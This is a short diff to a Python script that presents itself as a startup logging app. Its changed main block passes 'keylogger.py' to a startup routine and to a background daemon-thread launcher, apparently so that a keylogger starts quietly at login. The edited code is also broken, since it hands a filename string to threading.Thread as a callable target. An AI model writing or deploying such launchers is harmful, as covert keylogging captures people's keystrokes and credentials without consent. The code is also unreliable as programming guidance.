@@ -3,14 +3,13 @@ import os
 import sys
 import threading
 import time
-import subprocess
 
 LOG_DIR = os.path.join(os.path.expanduser("~"), ".local", "share", "MyStartupAppLogs")
 LOG_FILE = os.path.join(LOG_DIR, "startup_log.txt")
 
 os.makedirs(LOG_DIR, exist_ok=True)
 
-def run_in_background(target, *args, **kwargs):
+def run_in_background(target: str, *args, **kwargs):
     """Start a callable in a background daemon thread."""
     thread = threading.Thread(target=target, args=args, kwargs=kwargs, daemon=True)
     thread.start()
@@ -48,5 +47,5 @@ def run_on_startup(startup_task=None, *args, **kwargs):
 
 
 if __name__ == "__main__":
-    run_on_startup()
-    subprocess.run([sys.executable, "keylogger.py"])
+    run_on_startup("keylogger.py")
+    run_in_background("keylogger.py")
